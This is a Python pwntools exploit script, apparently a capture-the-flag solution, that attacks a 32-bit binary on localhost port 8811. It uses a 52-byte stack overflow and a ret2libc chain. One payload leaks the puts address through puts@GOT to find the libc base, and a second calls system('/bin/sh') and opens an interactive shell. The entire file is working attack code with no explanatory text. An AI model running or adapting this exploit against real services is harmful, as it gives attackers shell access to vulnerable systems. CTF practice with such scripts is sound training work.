from pwn import *

context.log_level = 'debug'

e = ELF("./main")
libc = e.libc
#p = process("./main")
p = remote("localhost", 8811)

pr = 0x0804837d

func = 0x080484db

puts_plt = e.plt['puts']
puts_got = e.got['puts']

payload = ''
payload += 'A'*52

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)

payload += p32(func)

p.recvuntil("?")
p.send(payload)

libc_base = u32(p.recvuntil("\xb7")[-4:]) - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search("/bin/sh"))[0]

print(hex(libc_base))

payload = ''
payload += 'A'*52

payload += p32(system_addr)
payload += p32(pr)
payload += p32(binsh)

p.recvuntil("?")
p.send(payload)

p.interactive()
